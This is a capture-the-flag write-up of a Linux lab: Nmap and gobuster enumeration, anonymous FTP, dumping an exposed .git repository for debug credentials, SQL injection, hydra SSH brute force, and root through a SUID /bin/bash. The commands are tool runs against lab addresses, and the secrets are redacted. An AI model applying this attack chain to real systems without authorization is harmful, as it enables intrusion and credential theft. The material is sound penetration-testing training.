---
title: "The Lumon Incident"
date: "September 12, 2026"
reading: "7 min read"
description: "A Linux CTF end to end: username enumeration, an SSH password attack for a foothold, credentials tucked in a backup, and a SUID /bin/bash to root — around a maze of rabbit holes."
tags: ctf, linux, privesc
---

![](Attachments/Pasted%20image%2020260912180602.png)

## Summary

The lab runs on a Linux server hosting a web server and an FTP server, with SSH also enabled. The foothold consists of gathering a list of usernames and performing a password attack on the server to get access via SSH. The second account's credentials are stored in a backup file, and the SUID bit is set on `/bin/bash`, so the root path is straightforward. That said, the machine is full of rabbit holes.

### Scanning and enumeration

We began with an Nmap scan, found 3 services running, and noticed that the server is running Linux:

![](Attachments/Pasted%20image%2020260912033823.png)

```bash
# Nmap 7.93 scan initiated Sat Sep 12 06:17:26 2026 as: nmap -Pn -p- -A --vv -oN scan.txt 10.64.128.39
Nmap scan report for ip-10-64-128-39.ec2.internal (10.64.128.39)
Host is up, received user-set (0.00038s latency).
Scanned at 2026-09-12 06:17:28 UTC for 26s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
21/tcp   open  ftp     syn-ack ttl 64 vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Apr 11 22:03 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.64.72.193
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d666f2a0479379ac42223aba6c6148b2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBPiu37GlG8VFw/5TP0GaOjaO4y4OQ+I4h9TpHc4iqcoBrHyJkHcXGruhY1RS0UBmo6rHknFsIkoUvylGMzl24k=
|   256 48d541b5605a3eff0da7f6cf1619a2e6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVYXJyJUNm1qN0KU3IyXzM0u12hR1uMFj6PKNbr6/As
9999/tcp open  http    syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/severed-floor/ /orientation/handbook/
|_http-title: Lumon Industries
| http-git: 
|   10.64.128.39:9999/.git/
|     Git repository found!
|     .git/config matched patterns 'user'
|     .git/COMMIT_EDITMSG matched patterns 'bug'
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: remove debug credentials from config 
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=9/12%OT=21%CT=1%CU=42871%PV=Y%DS=1%DC=T%G=Y%TM=6AA4EE9
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M23
OS:01ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4
OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A
OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=
OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
OS:T=40%CD=S)

Uptime guess: 41.035 days (since Sun Aug  2 05:27:14 2026)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT     ADDRESS
1   0.86 ms ip-10-64-128-39.ec2.internal (10.64.128.39)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 12 06:17:54 2026 -- 1 IP address (1 host up) scanned in 27.91 seconds
```

We first took a look at the FTP server and found a list of users:

```
┌──(root㉿kali)-[~/lumen/findings]
└─# ftp 10.64.128.39                                                      
Connected to 10.64.128.39.
220 Lumon Industries — Secure File Transfer
Name (10.64.128.39:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40027|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Apr 11 22:03 backup
226 Directory send OK.
ftp> cd backup
250 Directory successfully changed.
ftp> mget *
-------------more----------------
              
```

These are the files we downloaded, from which one could build a list of users to try bruteforcing:

```bash
cat IT-notice.txt employee-roster.csv welcome-packet.txt

From: Graner, D.
To: Severed Floor Staff
Date: 2024-03-15
Subject: Intranet Migration Complete

The intranet has been migrated to the new server successfully.
All department pages are now accessible at the usual address.

Please report any display issues or broken links to IT immediately.

REMINDER: The development repository used during migration should
have been cleaned up. If you still see any .git artifacts or
leftover development files on the web server, notify me immediately
so I can remove them. This is a compliance issue.

Additionally, the MDR terminal has been updated. All refiners should
verify their access before the next work cycle.
-------------more----------------
```

We took a look at the website to see what's there and found an admin page and a login page:

![](Attachments/Pasted%20image%2020260912190438.png)

![478](Attachments/Pasted%20image%2020260912033322.png)

At this point we ended up doing a directory busting attack on the website and uncovered an exposed .git repository, hoping to find credentials stored there:

```
┌──(root㉿kali)-[~]
└─# gobuster dir -u http://10.64.128.39:9999 -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.128.39:9999
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2026/09/12 06:25:42 Starting gobuster in directory enumeration mode
===============================================================
/.history             (Status: 403) [Size: 162]
/.cvs                 (Status: 403) [Size: 162]
/.bashrc              (Status: 403) [Size: 162]
/.hta                 (Status: 403) [Size: 162]
/.config              (Status: 403) [Size: 162]
/.forward             (Status: 403) [Size: 162]
/.cvsignore           (Status: 403) [Size: 162]
/.htaccess            (Status: 403) [Size: 162]
/.cache               (Status: 403) [Size: 162]
/.git/HEAD            (Status: 200) [Size: 21]
-------------more----------------
```

Upon discovering the exposed repository, we began googling to understand how it could be used to access the repository, or at least get a set of credentials, which landed us on [exposed .git](https://dev.to/k1ven/how-to-explore-an-exposed-git-57m3).

Turns out one could grab the repository using a tool called [[gitdumper]], which would allow us to navigate the repository's files and folders.

```
┌──(root㉿kali)-[~/lumen/share]
└─# ./gitdumper.sh http://10.64.128.39:9999/.git/ git-directory
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########
-------------more----------------
```

Now we could see the changes made to the repository, then cat out the exact code with the line changes marked:

```
┌──(root㉿kali)-[~/lumen/share/git-directory]
└─# for i in $(cat list | awk '{print $2}'); do  git cat-file -p $i;done;

tree 71ffa4188a0f934c56fc8b23e024d1ab6c376e6a
author Doug Graner <dgraner@lumon.industries> 1705327200 -0500
committer Doug Graner <dgraner@lumon.industries> 1705327200 -0500

initial intranet setup
tree da0c9f1bcfc12e6bd02decd165cabcbce3139429
-------------more----------------
```

Allowing us to get the login form credentials:

```
┌──(root㉿kali)-[~/lumen/share/git-directory]
└─# for i in $(cat list | awk '{print $2}'); do  git show  $i;done;

commit 300329d4b1cc76a87f211a57b3e52e27052cf5a6
Author: Doug Graner <dgraner@lumon.industries>
Date:   Mon Jan 15 09:00:00 2024 -0500

    initial intranet setup

diff --git a/index.html b/index.html
new file mode 100644
index 0000000..25168f2
--- /dev/null
+++ b/index.html
@@ -0,0 +1,8 @@
+<!DOCTYPE html>
...
...
...
+# Debug credentials — REMOVE BEFORE PRODUCTION
+MDR_ADMIN_USER=######
+MDR_ADMIN_PASS=###########
diff --git a/app.py b/app.py
-------------more----------------
```

Upon logging in, we found a search bar vulnerable to SQLi, so we did some enumeration to find which database it was using, so we could send the right payloads:

![](Attachments/Pasted%20image%2020260912194038.png)

As there were 4 columns, we tried querying three numbers and the data we wanted, which gave us the table names and their column names:

![](Attachments/Pasted%20image%2020260912034358.png)

We were able to read the first flag and other information, including the usernames and bcrypt password hashes. bcrypt takes a long time to crack, so rather than cracking them offline we trimmed the list of users we found, dropped the unlikely ones, and ran a hydra password attack against the server's SSH, which would be faster:

![](Attachments/Pasted%20image%2020260912194637.png)

![](Attachments/Pasted%20image%2020260912041206.png)

After gathering the hashes and the list of users, we ran a password attack against SSH using that user list and the rockyou.txt password list:

![](Attachments/Pasted%20image%2020260912195114.png)

Upon logging in with the valid SSH credentials, we did some digging and found cleartext credentials in a backup file:

![](Attachments/Pasted%20image%2020260912195333.png)

We then used those to log in as that user and grab their flag:

![](Attachments/Pasted%20image%2020260912195914.png)

We then proceeded to the last phase, privilege escalation, which was fairly easy, as the bash binary had the SUID bit set, allowing any user to run it with -p to elevate their privileges and grab the last flag.

![](Attachments/Pasted%20image%2020260912200534.png)